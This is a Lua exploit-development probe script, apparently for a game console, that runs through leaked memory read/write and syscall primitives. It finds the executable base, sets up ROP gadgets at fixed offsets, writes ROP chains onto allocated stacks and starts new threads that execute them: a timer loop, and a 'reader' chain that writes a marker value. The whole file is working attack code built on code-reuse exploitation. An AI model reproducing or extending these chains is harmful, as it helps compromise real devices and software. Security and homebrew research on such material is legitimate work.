-- CRASH_CLASS: LOW
-- PROBE 1403p: minimal reader child — just write marker + loop
--
-- Test: can a second child thread (alongside timer) write a marker
-- and sit in an infinite loop without crashing?

print("=== 1403p: minimal reader ===")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function wd(a, v) memory.write_dword(a, v) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function wq2(a, hi, lo) wd(a, lo); wd(a + 4, hi) end
local function get_hi_lo(v)
    if type(v) == "table" and v.h then return v.h, v.l end
    return 0, N(v)
end

-- addr helper: takes a Lua number, returns {hi, lo}
local function hl(n)
    return {math.floor(n / 0x100000000), n % 0x100000000}
end

-- Setup
local info = memory.alloc(0x200)
wd(N(info), 0x160)
pcall(function() mk(593)(uint64(0), info) end)
local eb_lo = rd(N(info) + 0x108) or 0
local eb_hi = rd(N(info) + 0x10C) or 0
print(string.format("eboot=0x%X%08X", eb_hi, eb_lo))

-- Gadgets as {hi, lo}
local pop_rax_ret   = {eb_hi, eb_lo + 0x992}
local pop_rdi_ret   = {eb_hi, eb_lo + 0xC9DFE}
local pop_rsi_ret   = {eb_hi, eb_lo + 0xD77D}
local mov_w         = {eb_hi, eb_lo + 0x92C67}   -- mov [rdi],rax;ret
local mov_r_rsi     = {eb_hi, eb_lo + 0x1A5CC4}  -- mov rax,[rsi];ret
local inc64_rdi_ret = {eb_hi, eb_lo + 0x161779}
local pop_rbp_ret   = {eb_hi, eb_lo + 0x79}
local leave_ret     = {eb_hi, eb_lo + 0x1A2AE3}

-- Shared result buffer
local result = memory.alloc(256)
local result_n = N(result)
for i = 0, 248, 4 do wd(result_n + i, 0xAA) end -- sentinel fill
local result_hl = hl(result_n)

-- ============================================================
-- [A] Timer thread (proven working)
-- ============================================================
local counter = memory.alloc(64)
local counter_n = N(counter)
for i = 0, 56, 4 do wd(counter_n + i, 0) end

local STSZ = 0x4000
local stk1 = memory.alloc(STSZ + 128)
local stk1_n = N(stk1)
for i = 0, STSZ + 124, 4 do wd(stk1_n + i, 0) end
local rsp1 = math.floor((stk1_n + STSZ) / 16) * 16 - 8
local rsp1_hl = hl(rsp1)

-- Timer chain: inc [rdi] → pop_rbp → &chain_base → leave → loop
wq2(rsp1 + 0,  0, 0xDEAD)
wq2(rsp1 + 8,  inc64_rdi_ret[1], inc64_rdi_ret[2])
wq2(rsp1 + 16, pop_rbp_ret[1], pop_rbp_ret[2])
wq2(rsp1 + 24, rsp1_hl[1], rsp1_hl[2])
wq2(rsp1 + 32, leave_ret[1], leave_ret[2])

local sc_thr = mk(455)
local p1 = memory.alloc(0x40)
local p1n = N(p1)
wq2(p1n, pop_rax_ret[1], pop_rax_ret[2])
wq2(p1n + 0x08, get_hi_lo(counter))
wq2(p1n + 0x10, get_hi_lo(stk1))
wq2(p1n + 0x18, 0, STSZ)
wq2(p1n + 0x30, 0, 0)

local ok1, rv1 = pcall(function()
    return sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p1n / 0x100000000), p1n % 0x100000000)),
        uint64("0x38"))
end)
print(string.format("timer rv=%d", ok1 and N(rv1) or -999))

local dummy = 0
for i = 1, 3000 do dummy = dummy + 1 end
local tc = rd(counter_n) or 0
print(string.format("counter=%d", tc))

-- ============================================================
-- [B] Minimal reader: pop_rax → marker, pop_rdi → result, mov_w → loop
-- ============================================================
local STSZ2 = 0x4000
local stk2 = memory.alloc(STSZ2 + 256) -- extra for chain
local stk2_n = N(stk2)
for i = 0, STSZ2 + 252, 4 do wd(stk2_n + i, 0) end
local rsp2 = math.floor((stk2_n + STSZ2) / 16) * 16 - 8

-- Chain at rsp2:
-- [0] dummy for pop_rax
-- [1] pop_rax; ret       — set RAX = 0xCAFEBABE
-- [2] 0xCAFEBABE
-- [3] pop_rdi; ret       — set RDI = result addr
-- [4] result addr
-- [5] mov [rdi],rax; ret — write marker
-- === loop entry at [6] ===
-- [6] pop_rbp; ret       — mov_w rets here
-- [7] &loop_base         — RBP = loop_base
-- [8] leave; ret         — enters loop
-- loop_base at [9]:
-- [9] 0xAAAA             — leave pops this
-- [10] pop_rbp; ret      — leave rets here
-- [11] &loop_base
-- [12] leave; ret        — loops

local chain = {}
chain[1] = {0, 0xBBBB}              -- dummy for entry pop_rax
chain[2] = pop_rax_ret               -- pop_rax; ret
chain[3] = {0, 0xCAFEBABE}           -- marker value
chain[4] = pop_rdi_ret               -- pop_rdi; ret
chain[5] = result_hl                  -- result address
chain[6] = mov_w                      -- mov [rdi],rax; ret
-- Loop entry: mov_w rets to chain[7] = pop_rbp
-- loop_base is at chain[10] (rsp2 + 9*8)
local loop_addr = rsp2 + 9 * 8
local loop_hl = hl(loop_addr)
chain[7] = pop_rbp_ret            -- entry to loop
chain[8] = loop_hl                -- RBP = &loop_base
chain[9] = leave_ret              -- first leave
chain[10] = {0, 0xAAAA}           -- leave pops this
chain[11] = pop_rbp_ret           -- leave rets here
chain[12] = loop_hl               -- RBP = loop_base again
chain[13] = leave_ret             -- loop back

print(string.format("chain: %d slots, rsp2=0x%X, loop_base=0x%X", #chain, rsp2, loop_addr))
print(string.format("result_hl: 0x%X%08X", result_hl[1], result_hl[2]))

-- Write chain (one at a time, no uint64 conversion needed)
for i = 1, #chain do
    local off = (i-1) * 8
    wq2(rsp2 + off, chain[i][1], chain[i][2])
end
print("chain written")

-- Verify first few slots
for i = 0, 7 do
    local lo = rd(rsp2 + i*8) or 0
    local hi = rd(rsp2 + i*8 + 4) or 0
    print(string.format("  [%d] 0x%X%08X", i, hi, lo))
end

-- Start reader child
local p2 = memory.alloc(0x40)
local p2n = N(p2)
wq2(p2n, pop_rax_ret[1], pop_rax_ret[2]) -- start_func
wq2(p2n + 0x08, 0, 0)                      -- arg (unused)
wq2(p2n + 0x10, hl(stk2_n)[1], hl(stk2_n)[2]) -- stack_base
wq2(p2n + 0x18, 0, STSZ2)                  -- stack_size
wq2(p2n + 0x30, 0, 0)                      -- child_tid

local ok2, rv2 = pcall(function()
    return sc_thr(uint64(string.format("0x%X%08X",
        math.floor(p2n / 0x100000000), p2n % 0x100000000)),
        uint64("0x38"))
end)
print(string.format("reader rv=%d", ok2 and N(rv2) or -999))

-- Wait for marker
local found = false
for w = 1, 500 do
    local v = rd(result_n) or 0
    if v == 0xCAFEBABE then
        print(string.format("MARKER FOUND after %d waits", w))
        found = true
        break
    end
    for j = 1, 50 do dummy = dummy + 1 end
end

if not found then
    local v = rd(result_n) or 0
    local v2 = rd(result_n + 4) or 0
    print(string.format("marker NOT found: result[0]=0x%08X result[4]=0x%08X", v, v2))
end

-- Check counter still running
local tc2 = rd(counter_n) or 0
print(string.format("counter final=%d (was %d)", tc2, tc))

print("")
print("=== 1403p DONE ===")
